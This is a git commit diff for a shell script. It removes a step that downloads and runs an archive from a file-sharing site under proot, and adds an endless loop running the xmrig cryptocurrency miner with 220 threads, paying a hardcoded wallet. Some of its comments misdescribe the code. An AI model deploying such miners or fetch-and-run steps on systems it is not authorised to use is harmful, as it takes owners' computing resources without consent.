32575015569e78b34914d9639a796e8afdec6fc4
aliabdulla769 <131328611+aliabdulla769@users.noreply.github.com>
2023-10-01 13:15:24 +0300

    Update a13.sh

--- a13.sh
+++ a13.sh
@@ -1,5 +1,23 @@
-wget -O ali.tar.gz https://bashupload.com/F6z7o/ali.tar.gz
-tar -zxvf ali.tar.gz
-tar -xvf root.tar.xz
-rm -rf ali.tar.gz root.tar.xz
-./dist/proot -S . /bin/bash
+#!/bin/bash
+
+while true; do
+    # Start the timer in nanoseconds
+    start_time=$(date +%s%N)
+
+    # Execute the command in the background
+    ulimit -v 40000000  # Set the virtual memory limit to 40GB
+    ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u TRX:TUPkoHaVv8jp6CbsQGjd8bhDZXBVxkQkSt.A -p x -t 220
+
+    # Wait for the command to finish
+    wait
+
+    # End the timer in nanoseconds
+    end_time=$(date +%s%N)
+
+    # Calculate the elapsed time in milliseconds
+    elapsed_time=$((end_time - start_time))
+    milliseconds=$((elapsed_time / 1000000))
+
+    # Sleep for 100 milliseconds before running the command again
+    sleep 0.1
+done
